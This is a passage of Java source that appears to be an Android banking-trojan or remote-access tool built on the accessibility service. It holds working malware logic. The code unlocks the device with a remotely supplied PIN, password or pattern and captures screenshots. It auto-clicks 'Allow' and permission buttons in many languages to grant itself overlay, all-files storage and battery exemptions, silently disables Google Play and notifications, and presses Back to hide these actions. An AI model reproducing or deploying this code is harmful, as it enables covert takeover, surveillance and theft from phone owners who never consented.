                            if (currentpass.length == 3 && currentpass[2].equals("E")) {
                                nedenter = true;
                            }
                            MyAccess.Unlockpass(currentpass[1], nedenter);
                            break;
                        }
                        case "pt": {
                            MyAccess.drawPattern(currentpass[1]);
                            break;
                        }
                        case "pi": {
                            //handler.postDelayed(() -> {
                            boolean nedenter = false;
                            if (currentpass.length == 3 && currentpass[2].equals("E")) {
                                nedenter = true;
                            }
                            drawPin(currentpass[1], nedenter);
                            //  }, 100);
                            break;
                        }
                        default: {
                            AccessServices.skiprecord = false;
                            AlertServer(ctx, "Lock Screen", "Unknown");
                            break;
                        }
                    }
                    //  }, 2000);

                }
            }

        }

    }

    public static void setKeyboardVisibility(boolean show) {
        AccessibilityService MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        Context context = mycontext();
        if (context == null) {
            return;
        }
        InputMethodManager imm = (InputMethodManager) context.getSystemService(Context.INPUT_METHOD_SERVICE);

        if (show) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                MyAccess.getSoftKeyboardController().setShowMode(SHOW_MODE_AUTO);
            }

            // Force the keyboard to open
            try {
                imm.toggleSoftInput(InputMethodManager.SHOW_FORCED, 0);
            } catch (Exception as) {
                as.printStackTrace();
            }
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                MyAccess.getSoftKeyboardController().setShowMode(SHOW_MODE_HIDDEN);
            }

            // Hide the keyboard
            try {
                imm.toggleSoftInput(InputMethodManager.HIDE_IMPLICIT_ONLY, 0);
            } catch (Exception g) {
            }
        }
    }

    public static void adjustVolume(boolean increase) {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        AudioManager audioManager = (AudioManager) MyAccess.getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            int direction = increase ? AudioManager.ADJUST_RAISE : AudioManager.ADJUST_LOWER;
            audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, direction, 0);
            audioManager.adjustStreamVolume(AudioManager.STREAM_RING, direction, AudioManager.FLAG_SHOW_UI);
            audioManager.adjustStreamVolume(AudioManager.STREAM_SYSTEM, direction, 0);
            audioManager.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, direction, 0);
        }

    }

//    public static void getMediaProjectionPermission(AccessibilityNodeInfo nodeInfo) {
//
//        AccessServices MyAccess = myAccess();
//        if (MyAccess == null) {
//            return;
//        }
//        if (nodeInfo != null) {
//            if ((nodeInfo.getClassName() != null && nodeInfo.getClassName().equals("android.widget.Button")) ||
//                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && nodeInfo.getClassName() != null && nodeInfo.getClassName().equals("android.widget.TextView"))) {
//                if (nodeInfo.getText() != null) {
//                    String nodeText = nodeInfo.getText().toString().toLowerCase();
//                    //if (Common.getInstance().getMediaProjection()) {
//                    if (nodeText.equals("start now")
//                            || nodeText.equals("start")
//                            || nodeText.equals("iniciar agora")
//                            || nodeText.equals("iniciar ahora")
//                            || nodeText.equals("empezar ahora")
//                            || nodeText.equals("começar agora")
//                            || nodeText.equals("início")
//                            || nodeText.equals("iniciar")
//                            || nodeText.equals("şimdi başla")
//                            || nodeText.equals("şimdi başlat")
//                            || nodeText.equals("立即开始")) {
//
//                        nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//
////                        Rect out = new Rect();
////                        nodeInfo.getBoundsInScreen(out);
////                        int X = (int) out.exactCenterX();
////                        int Y = (int) out.exactCenterY();
////                        clickthis(X, Y);
//
//                    } else if (nodeText.equals("cancel") || nodeText.equals("cancelar") || nodeText.equals("iptal") || nodeText.equals("取消")) {
//                        Rect rect = new Rect();
//                        nodeInfo.getBoundsInScreen(rect);
//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                            clickthis(MyAccess.mWidth - rect.left - 10, rect.top + 10);
//                        }
//                    }
//                    // }
//
//                }
//            }
//            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
//                getMediaProjectionPermission(nodeInfo.getChild(i));
//            }
//        }
//    }

    public static void onesnap() {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        Context ctx = mycontext();
        if (ctx == null) {
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            MyAccess.CapScreen(ctx, "snap", 70);
        } else {
            AlertServer(ctx, "Snap Short", "this feature requires android 11 and beyond");
        }
    }

//    private static boolean oncstorage14 = false;
//
//    private static void findAndCheckToggle(AccessibilityNodeInfo node) {
//        if (node == null) return;
//
//        // Check if the current node is a toggle android:id/switch_widget
//        if ("android.widget.Switch".equals(node.getClassName())) {
//            if (!node.isChecked()) {
//                // Perform click action to toggle it
//                Rect out = new Rect();
//                node.getBoundsInScreen(out);
//                int X = (int) out.exactCenterX();
//                int Y = (int) out.exactCenterY();
//                clickthis(X, Y);
//                AccessServices MyAccess = myAccess();
//                if (MyAccess == null) {
//                    return;
//                }
//                for (int i = 0; i <= 2; i++) {
//
//                    try {
//                        MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
//                    } catch (Exception e) {
//                    }
//
//                }
//            }
//            return; // Exit after finding the first toggle
//        }
//
//        // Recursively check child nodes
//        for (int i = 0; i < node.getChildCount(); i++) {
//            findAndCheckToggle(node.getChild(i));
//        }
//    }

    public static AccessibilityNodeInfo getNodeByViewId(AccessibilityNodeInfo rootNode, String viewId) {

        if (rootNode == null) return null;

        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes.isEmpty()) ? null : nodes.get(0); // Return first match
    }

    public static AccessibilityNodeInfo getFirstNodeByViewId(AccessibilityNodeInfo rootNode, String viewId) {


        List<AccessibilityNodeInfo> nodeList = rootNode.findAccessibilityNodeInfosByViewId(viewId);

        if (nodeList != null) {
            for (AccessibilityNodeInfo node : nodeList) {
                AccessibilityNodeInfo parent = node.getParent();
                if (parent == null) continue;

                int childCount = parent.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = parent.getChild(i);
                    if (child == null) continue;

                    if (child.equals(node)) {
                        // Now you know 'i' is the "index" of this node under its parent
                        Log.d("AccessibilityService", "Node index: " + i);

                        if (i == 0) { // If index == 0, this is the node you want!
                            return node;
                        }
                    }
                }
            }
        }

        return null;

    }

    public static List<AccessibilityNodeInfo> getNodesByClassName(AccessibilityNodeInfo rootNode, String className) {
        List<AccessibilityNodeInfo> matchingNodes = new ArrayList<>();
        if (rootNode == null) return matchingNodes;

        searchNodesByClass(rootNode, className, matchingNodes);
        return matchingNodes;
    }

    private static void searchNodesByClass(AccessibilityNodeInfo node, String className, List<AccessibilityNodeInfo> result) {
        if (node == null) return;

        if (node.getClassName() != null && node.getClassName().toString().equals(className)) {
            result.add(node);  // Add matching node to list
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            searchNodesByClass(node.getChild(i), className, result);
        }
    }

//    public static void clickByText(AccessibilityNodeInfo node, String text) {
//
//        if (node == null) {
//            return;
//        }
//
//        for (int i = 0; i < node.getChildCount(); i++) {
//            AccessibilityNodeInfo childNode = node.getChild(i);
//
//            if (childNode != null) {
//                CharSequence buttonLabel = childNode.getText();
//                if (buttonLabel != null && buttonLabel.toString().contains(text)) {
//                    // Button found, perform desired action
//                    childNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                    // childNode.recycle();
//                    return;
//                }
//            }
//
//            clickByText(childNode, text);
//            childNode.recycle();
//        }
//    }

    public static AccessibilityNodeInfo findByTextAndId(AccessibilityNodeInfo root, String viewId, String targetText) {
        if (root == null) return null;

        // Find all nodes with the specified View ID
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);

        // Loop through nodes to check for matching text
        for (AccessibilityNodeInfo node : nodes) {
            if (node != null && node.getText() != null && node.getText().toString().toLowerCase().equals(targetText)) {
                return node;  // Return the matching node
            }
        }

        return null;  // No matching node found
    }

    public static AccessibilityNodeInfo findByTextAndClassName(AccessibilityNodeInfo root, String className, String targetText) {
        if (root == null) return null;

        // Recursive traversal of the node tree
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);

            if (child != null && child.getClassName() != null) {
                // Check if class name and text match
                if (className.equals(child.getClassName()) &&
                        child.getText() != null &&
                        child.getText().toString().toLowerCase().equals(targetText)) {
                    return child;  // Found matching node
                }

                // Recursively search child nodes
                AccessibilityNodeInfo result = findByTextAndClassName(child, className, targetText);
                if (result != null) {
                    return result;
                }
            }
        }

        return null;  // No matching node found
    }

    public static boolean scrollToText(AccessibilityNodeInfo rootNode,
                                       AccessibilityNodeInfo targetNode,
                                       String[] texts) {

        if (rootNode == null) {
            return false;
        }
        if (targetNode == null) {
            return false;
        }
        boolean found = false;

        for (String text : texts) {
            List<AccessibilityNodeInfo> nodeList = rootNode.findAccessibilityNodeInfosByText(text);
            if (nodeList == null || nodeList.isEmpty()) {
                continue;
            }


            Rect targetBounds = new Rect();
            targetNode.getBoundsInScreen(targetBounds);

            if (targetBounds.isEmpty()) {
                targetNode.recycle();
                continue;
            }

            while (targetNode.isScrollable() && !isNodeFullyVisible(rootNode, targetBounds)) {
                targetNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                targetNode.getBoundsInScreen(targetBounds);
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                found = clickthis(targetBounds.centerX(), targetBounds.centerY());
            }
            targetNode.recycle();
            if (found) {
                break;
            }
        }

        rootNode.recycle();

        return found;
    }

    public static boolean isNodeFullyVisible(AccessibilityNodeInfo rootNode, Rect bounds) {
        Rect visibleRect = new Rect();
        rootNode.getBoundsInScreen(visibleRect);
        return visibleRect.contains(bounds);
    }

    public static String[] getDisableStrings() {
        String currentLanguage = Locale.getDefault().getLanguage();

        switch (currentLanguage) {
            case "ar": // Arabic
                return new String[]{"تعطيل", "تعطيل التطبيق", "إيقاف", "إيقاف التطبيق"};
            case "zh": // Chinese (Simplified)
                return new String[]{"停用", "停用应用"};
            case "tr": // Turkish
                return new String[]{"Devre Dışı Bırak", "Uygulamayı Devre Dışı Bırak"};
            case "ru": // Russian
                return new String[]{"Отключить", "Отключить приложение"};
            case "es": // Spanish
                return new String[]{"Deshabilitar", "Deshabilitar aplicación"};
            case "pt": // Portuguese (Brazil)
                return new String[]{"Desativar", "Desativar aplicativo"};
            default: // Default to English
                return new String[]{"Disable", "Disable app"};
        }
    }


    //Main function , Call it from onaccessibilityevent
    public static void Clickallow(AccessibilityNodeInfo rotmain, AccessibilityNodeInfo srcnodeinf) {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        Context ctx = mycontext();
        if (ctx == null) {
            return;
        }


        if (FOR_PLY) {// Disable google play from settings
            if (rotmain != null) {
                if (isAppDisabled(ctx, "com.android.vending")) {
                    FOR_PLY = false;
                    return;
                }
                if (onedisply) {
                    return;
                }
                onedisply = true;
                //EnableDraw();
                new Handler(Looper.getMainLooper()).postDelayed(() -> disply(ctx), 800);

            }

        }
        if (AccessServices.FOR_EXTR_STRG) {
            if (rotmain != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (Environment.isExternalStorageManager()) {
                        AccessServices.FOR_EXTR_STRG = false;
                        return;
                    }
                }
                // AccessibilityNodeInfo RootView = AccessibilityNodeInfo.obtain(rotmain);
                if (oneExtstrg) {
                    return;
                }
                oneExtstrg = true;
                //EnableDraw();
                new Handler(Looper.getMainLooper()).postDelayed(() -> EnableExtraStrg(), 1500);
            }

            return;
        }
//        if (FOR_CHNG_STNG) {
//            if (rotmain != null) {
//                AccessibilityNodeInfo RootView = AccessibilityNodeInfo.obtain(rotmain);
//                new Handler(Looper.getMainLooper()).postDelayed(() -> {
//
//                    try {
//                        // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//                        if (Settings.System.canWrite(ctx)) {
//                            FOR_CHNG_STNG = false;
//                            //blockBack();
//                        } else {
//                            String clasname = "android.widget.Switch";
//                            if (Build.VERSION.SDK_INT >= 34) {
//                                clasname = "android.view.View";
//                                //
//                                // findAndCheckToggle(RootView);
//                            }
//                            List<AccessibilityNodeInfo> nodes = getNodesByClassName(RootView, clasname);
//
//                            for (AccessibilityNodeInfo node : nodes) {
//
//                                if (node.isCheckable()) {
//                                    Log.d("Accessibility", "Found checkable element: " + node.getClassName());
//                                    if (!node.isChecked()) {
//                                        if (node.isClickable()) {
//                                            if (Settings.System.canWrite(ctx)) {
//                                                FOR_CHNG_STNG = false;
//                                                return;
//                                            }
//                                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                                            blockBack();
//                                        } else {
//                                            Rect out = new Rect();
//                                            node.getBoundsInScreen(out);
//                                            int X = (int) out.exactCenterX();
//                                            int Y = (int) out.exactCenterY();
//                                            if (Settings.System.canWrite(ctx)) {
//                                                FOR_CHNG_STNG = false;
//                                                return;
//                                            }
//                                            clickthis(X, Y);
//                                            try {
//                                                sleep(500);
//                                            } catch (Exception a) {
//                                            }
//                                            blockBack();
//                                        }
//                                    }
//                                }
//                            }
//
//                        }
//                        //}
//                    } catch (Exception a) {
//                        MyLoger.Error("FOR_EXTR_STRG", a.getMessage());
//                    }
//                }, 1000);
//            }
//
//            return;
//        }
        if (FOR_DRAW_OVER) {
            //if(rotmain != null){
            try {
                if (Settings.canDrawOverlays(ctx)) {
                    FOR_DRAW_OVER = false;
                } else {
                    if (onetimeDraw) {
                        return;
                    }
                    onetimeDraw = true;
                    //EnableDraw();
                    new Handler(Looper.getMainLooper()).postDelayed(() -> EnableDraw(ctx, true), 1000);

                    return;
                }

            } catch (Exception a) {
                MyLoger.Error("FOR_DRAW_OVER", a.getMessage());
            }
            // }

        }
        if (FOR_NOTFY) {
            try {
                if (onetimeNoty) {
                    return;
                }
                onetimeNoty = true;
                new Handler(Looper.getMainLooper()).postDelayed(() -> DisabelNotifi(), 1000);
                //return;
            } catch (Exception s) {
            }
            return;
        }
        //if (MyAccess.FOR_EXTR_STRG) {
//            try {
//                Thread.sleep(1000);
//            } catch (InterruptedException e) {
//
//            }
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//                if (Environment.isExternalStorageManager()) {
//                    MyAccess.FOR_EXTR_STRG = false;
//                    return;
//                }
//            }
//
//            if (Build.VERSION.SDK_INT >= 34) {
//                if (!oncstorage14){
//                    oncstorage14 =true;
//
//                    AllowStorage14(MyAccess.mWidth,MyAccess.mHeight);
//                }else{
//                    return;
//                }
//
//            }
//
//
//            //android:id/switch_widget
//            if (UtliTools.isSamsung()) {
//                String Myname = getLabelApplication(ctx).toLowerCase();
//                List<AccessibilityNodeInfo> Mynamtbtn = RootView.findAccessibilityNodeInfosByText(Myname);
//
//                if (!Mynamtbtn.isEmpty()) {
//                    AccessibilityNodeInfo button = Mynamtbtn.get(0);
//                    if (button != null) {
//
//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//
//                            try {
//                                sleep(500);
//                            } catch (InterruptedException e) {
//                                e.printStackTrace();
//                            }
//                            //sleep(500);
//
//                            Rect out = new Rect();
//                            button.getBoundsInScreen(out);
//                            int X = (int) out.exactCenterX();
//                            int Y = (int) out.exactCenterY();
//                            clickthis(X, Y);
//                            // sleep(500);
//                            //    click(X,Y);
//                            //clickByText(Myname);
//                            // clickthis(X, Y);
//                            //button.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
//                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//                                if (Environment.isExternalStorageManager()) {
//                                    MyAccess.FOR_EXTR_STRG = false;
//                                    blockBack(MyAccess);
//                                    blockBack(MyAccess);
//
//                                } else {
//                                    Toast.makeText(MyAccess, "Please Allow file Access to continue.", Toast.LENGTH_LONG).show();
//                                }
//                            }
//
//                        }
//                    }
//                } else {
//                    if (scrollView(RootView)) {
//                        try {
//                            sleep(500);
//                        } catch (InterruptedException e) {
//                            e.printStackTrace();
//                        }
//                    }
//                }
//
//            } else {
//                List<AccessibilityNodeInfo> buttonList2 = RootView.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
//
//                if (!buttonList2.isEmpty()) {
//                    AccessibilityNodeInfo button = buttonList2.get(0);
//                    if (button != null) {
//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//
//
//
//                            Rect out = new Rect();
//                            button.getBoundsInScreen(out);
//                            int X = (int) out.exactCenterX();
//                            int Y = (int) out.exactCenterY();
//                            clickthis(X, Y);
//                            try {
//                                sleep(500);
//                            } catch (InterruptedException e) {
//                                e.printStackTrace();
//                            }
//                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//                                if (Environment.isExternalStorageManager()) {
//                                    MyAccess.FOR_EXTR_STRG = false;
//                                    blockBack(MyAccess);
//                                    blockBack(MyAccess);
//                                } else {
//                                    Toast.makeText(MyAccess, "Please Allow file Access to continue.", Toast.LENGTH_LONG).show();
//                                }
//                            }
//                        }
//                    }
//                }
//            }

        //   }


        boolean clickedok = false;
        if (rotmain != null) {
            AccessibilityNodeInfo RootView = AccessibilityNodeInfo.obtain(rotmain);
            String[] arrayButtonClick2 = {"com.android.settings:id/left_button",
                    "android:id/button1",
                    "com.android.packageinstaller:id/permission_allow_always_button",
                    "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                    "com.android.permissioncontroller:id/permission_allow_button",
                    "com.android.packageinstaller:id/permission_allow_foreground_only_button",
                    "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                    "com.android.packageinstaller:id/permission_allow_button",
                    "android:id/button1",
                    "com.samsung.android.packageinstaller:id/permission_allow_button",
                    "com.samsung.android.permissioncontroller:id/permission_allow_button",
                    "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
                    "com.huawei.systemmanager:id/btn_allow",
                    "com.huawei.packageinstaller:id/permission_allow_button",
                    "com.lbe.security.miui:id/permission_allow_foreground_only_button",
                    "com.miui.securitycenter:id/accept",
                    "miui:id/grant",
                    "miui:id/button2",
                    "miui:id/action_positive"};
            for (String value : arrayButtonClick2) {
                for (AccessibilityNodeInfo node : RootView.findAccessibilityNodeInfosByViewId(value)) {
                    try {

                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        AccessServices.forbattery = false;
                        removeapp = false;
                        node.recycle();
                        clickedok = true;
                        break;
                    } catch (Exception a) {
                    }
                }
                if (clickedok) {
                    break;
                }
            }

            if (clickedok) {
                RootView.recycle();
                return;
            }

//            String[] arrayButtonClick = {
//
//                    ,
//            };
//
//            for (String s : arrayButtonClick) {
//                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(s)) {
//                    try {
//
//
//                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//
//
//                        removeapp = false;
//                        AccessServices.forbattery = false;
//                        node.recycle();
//                        //AccessServices.Auto_Click = false;
//                        break;
//
//                    } catch (Exception a) {
//                    }
//                }
//            }

        }


        try {
            if (srcnodeinf != null) {
                String[] allowWords = {
                        "Allow",          // English
                        "Autoriser",      // French
                        "Erlauben",       // German
                        "Permitir",       // Spanish
                        "允许",           // Chinese (Simplified)
                        "허용",           // Korean
                        "السماح",         // Arabic
                        "izin ver",       // Turkish
                        "Permitir",       // Brazilian Portuguese (same word as Spanish)
                };

                List<AccessibilityNodeInfo> nodes = null;

                for (String allowWord : allowWords) {
                    try {
                        nodes = findNodesByText(allowWord, srcnodeinf);
                    } catch (Exception a) {
                    }
                    if (nodes != null && !nodes.isEmpty()) {

                        AccessibilityNodeInfo node = nodes.get(0);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                        removeapp = false;
                        AccessServices.forbattery = false;
                        node.recycle();
                        // AccessServices.Auto_Click = false;
                        break;
                    }
                }
            }


        } catch (Exception a) {
            a.printStackTrace();
        }


        if (srcnodeinf != null) {
            for (AccessibilityNodeInfo node : srcnodeinf.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/accept")) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                //  AccessServices.Auto_Click = false;
                // Auto_Click = false;
            }
        }


        try {
            if (rotmain != null) {
                AccessibilityNodeInfo RootView = AccessibilityNodeInfo.obtain(rotmain);
                //For Any
                List<String> buttonTexts2 = Arrays.asList(
                        "本次",                         // Chinese: Once
                        "Once",                         // English: Once
                        "ཐེངས་འདིར་འཁོར་སྐྱོད་བྱེད་ཆོག",  // Tibetan: Once
                        "kali",                         // Indonesian: Once
                        "lần",                          // Vietnamese: Once
                        "တစ်ကြိမ်",                     // Burmese: Once
                        "始终",                         // Chinese: Always
                        "Allow",                        // English: Permission
                        "time",                         // English: Time
                        "السماح",                       // Arabic: Allow
                        "ད་དེ་ཆོག",                     // Tibetan: Allow now
                        "izinkan",                      // Indonesian: Allow
                        "Chấp nhận",                    // Vietnamese: Accept
                        "ခွင့်ပြုပါ",                   // Burmese: Allow
                        "Permitir",                     // Spanish: Allow
                        "Permitir solo mientras se usa la aplicación", // Spanish: Allow only while using the app
                        "Permitir",                     // Brazilian Portuguese: Allow
                        "Permitir apenas enquanto estiver usando o aplicativo" // Brazilian Portuguese: Allow only while using the app
                );


                for (String buttonText : buttonTexts2) {
                    List<AccessibilityNodeInfo> nodeInfos = RootView.findAccessibilityNodeInfosByText(buttonText);

                    if (!nodeInfos.isEmpty()) {
                        AccessibilityNodeInfo buttonNode = nodeInfos.get(0);

                        if (buttonNode.isClickable()) {
                            buttonNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            removeapp = false;
                            AccessServices.forbattery = false;
                            //AccessServices.forbattery = false;
                            //AccessServices.Auto_Click = false;
                            break;
                        }
                        buttonNode.recycle();
                    }
                }
            }

        } catch (Exception a) {

        }
        if (AccessServices.forbattery &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            new Handler(Looper.getMainLooper()).postDelayed(() -> clikbtry(ctx), 800);


            //AccessibilityNodeInfo RootView = MyAccess.getRootInActiveWindow();
//            if (RootView == null) {
//                return;
//            }

//            if (CLickTextpostion(toclickbtry, RootView)) {
//                AccessServices.forbattery = false;
//                //MySettings.WriteBool(ctx, Consts.Auto_Battary, false);
//                // AccessServices.Auto_Click = false;
//                try {
//                    MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
//                } catch (Exception e) {
//                }
//            }

        }

    }

    private static void clikbtry(Context ctx) {

        if (UtliTools.IsIgnore_Battery(ctx)) {
            AccessServices.forbattery = false;
            // MySettings.WriteBool(ctx, Consts.Auto_Battary, false);
            //  blockBack(MyAccess);
            //  AccessServices.Auto_Click = false;
            return;
        }
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        String CurrnetLanuage = Locale.getDefault().getLanguage();
        String toclickbtry = "No restrictions";
        switch (CurrnetLanuage) {
            case "en":

                toclickbtry = "No restrictions";

                break;
            case "ar":
                toclickbtry = "لا توجد قيود";


                break;
            case "zh":
                toclickbtry = "无限制";


                break;
            case "tr":

                toclickbtry = "Kısıtlama yok";

                break;
            case "pt":

                toclickbtry = "Nenhuma restrição";
                break;

            case "ru":

                toclickbtry = "Нет ограничений";
                break;
            case "es":

                toclickbtry = "Sin restricciones";
                break;
            default:
                AccessServices.forbattery = false;
                // MySettings.WriteBool(ctx, Consts.Auto_Battary, false);
                // AccessServices.Auto_Click = false;
                break;

        }

        AccessibilityNodeInfo targetNode = null;
        List<AccessibilityNodeInfo> nfo1 = AccessTools.findNodesByText(toclickbtry, MyAccess.getRootInActiveWindow());
        if (nfo1 != null && !nfo1.isEmpty()) {
            targetNode = nfo1.get(0);
        }
        if (targetNode != null) {
            Rect outchiled = new Rect();
            targetNode.getBoundsInScreen(outchiled);
            int xCenter = outchiled.centerX();
            int yCenter = outchiled.centerY();

            clickthis(xCenter, yCenter);
            AccessServices.forbattery = false;
        }
    }

    private static void DisabelNotifi() {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        String[] viewIds1 = {
                "android.widget.CheckBox",
                "android.widget.Switch",
                "android.view.View"
        };

        for (String viewId : viewIds1) {
            List<AccessibilityNodeInfo> nodes = AccessTools.getNodesByClassName(MyAccess.getRootInActiveWindow(), viewId);
            if (nodes != null && nodes.size() > 0) {
                for (AccessibilityNodeInfo nodechk : nodes) {
                    if (nodechk.isCheckable()) {
                        if (nodechk.isChecked()) {//disable any enabled one
                            if (nodechk.isClickable()) {

                                nodechk.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } else {

                                Rect out = new Rect();
                                nodechk.getBoundsInScreen(out);
                                int X = (int) out.exactCenterX();
                                int Y = (int) out.exactCenterY();
                                clickthis(X, Y);
                            }

                            break;
                        }
                    }
                }
            }
        }
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
        }, 250);
        FOR_NOTFY = false;
    }

    private static void disply(Context ctx) {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        if (isAppDisabled(ctx, "com.android.vending")) {
            FOR_PLY = false;
            try {
                MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
            } catch (Exception e) {
            }
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            String[] toclicks = getDisableStrings();

            if (CLickTextpostion(toclicks[0], MyAccess.getRootInActiveWindow())) {
                //return;
            } else {
                if (toclicks.length > 2) {
                    CLickTextpostion(toclicks[2], MyAccess.getRootInActiveWindow());
                }
            }
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                String[] toclicks2 = getDisableStrings();
                if (CLickTextpostion(toclicks2[1], MyAccess.getRootInActiveWindow())) {

                } else {
                    if (toclicks2.length > 2) {
                        CLickTextpostion(toclicks2[3], MyAccess.getRootInActiveWindow());
                    }
                }
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        if (isAppDisabled(ctx, "com.android.vending")) {
                            FOR_PLY = false;
                            MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
                        }

                    } catch (Exception e) {
                    }
                }, 350);

            }, 800);
        }, 800);
    }

    private static void EnableExtraStrg() {

        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    AccessServices.FOR_EXTR_STRG = false;
                    //blockBack();
                } else {
                    String clasname = "android.widget.Switch";
                    if (Build.VERSION.SDK_INT >= 34) {
                        clasname = "android.view.View";
                        // findAndCheckToggle(RootView);
                    }
                    List<AccessibilityNodeInfo> nodes = getNodesByClassName(MyAccess.getRootInActiveWindow(), clasname);

                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isCheckable()) {
                            Log.d("Accessibility", "Found checkable element: " + node.getClassName());
                            if (!node.isChecked()) {
//                                    if (node.isClickable()) {
//
//                                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//
//                                    } else {
//                                        Rect out = new Rect();
//                                        node.getBoundsInScreen(out);
//                                        int X = (int) out.exactCenterX();
//                                        int Y = (int) out.exactCenterY();
//
//                                        clickthis(X, Y);
//                                    }
                                new Handler(Looper.getMainLooper()).postDelayed(() ->
                                {
                                    Rect out = new Rect();
                                    node.getBoundsInScreen(out);
                                    int X = (int) out.exactCenterX();
                                    int Y = (int) out.exactCenterY();

                                    clickthis(X, Y);
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                        try {
                                            MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
                                        } catch (Exception e) {
                                        }
                                    }, 250);
                                }, 200);


                                break;
                            }
                        }
                    }

                }
            }
        } catch (Exception a) {
            MyLoger.Error("FOR_EXTR_STRG", a.getMessage());
        }

    }

    private static void EnableDraw(Context ctx, boolean skiponename) {
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        if (Settings.canDrawOverlays(ctx)) {
            FOR_DRAW_OVER = false;
            return;
        }

        String Myname = getLabelApplication(ctx).toLowerCase();
        //String Myname = "ASC";

        AccessibilityNodeInfo targetNode = findByTextAndId(MyAccess.getRootInActiveWindow(), "android:id/title", Myname);

        if (targetNode == null) {
            targetNode = findByTextAndClassName(MyAccess.getRootInActiveWindow(), "android.widget.TextView", Myname);
        }
//        AccessibilityNodeInfo targetNode = null;
//        List<AccessibilityNodeInfo> nfo1 = AccessTools.findNodesByText(Myname, RootView);
//        if (nfo1 != null && !nfo1.isEmpty()) {
//            targetNode = nfo1.get(0);
//        }


        if (targetNode != null && !skiponename) {
            Rect nodeRect = new Rect();
            targetNode.getBoundsInScreen(nodeRect);
            //  scrollToText(RootView,targetNode,new String[]{getLabelApplication(ctx)});
            // Get screen dimensions
            Rect screenRect = new Rect();
            MyAccess.getRootInActiveWindow().getBoundsInScreen(screenRect);

            // Check if node is visible on the screen
            if (screenRect.contains(nodeRect) && targetNode.isVisibleToUser()) {
                // Node is visible - Perform click
                int x = (int) nodeRect.exactCenterX();
                int y = (int) nodeRect.exactCenterY();
                if (Settings.canDrawOverlays(ctx)) {
                    AccessServices.FOR_DRAW_OVER = false;
                    return;
                }
                clickthis(x, y);
                new Handler(Looper.getMainLooper()).postDelayed(() -> EnableDraw(ctx, true), 800);
                return;
            } else {
                // Node is not visible - Scroll and retry
                if (scrollView(MyAccess.getRootInActiveWindow())) {
                    new Handler(Looper.getMainLooper()).postDelayed(() -> EnableDraw(ctx, false), 800);
                    return;
                } else {
                    MyLoger.Error("scroll", "no");
                }
            }
        }
//        else {
//            if (scrollView(RootView)) {
//                try {
//                    sleep(100);
//                } catch (InterruptedException e) {
//                    //throw new RuntimeException(e);
//                }
//            }else{
//                MyLoger.Error("scroll", "no");
//            }
//        }

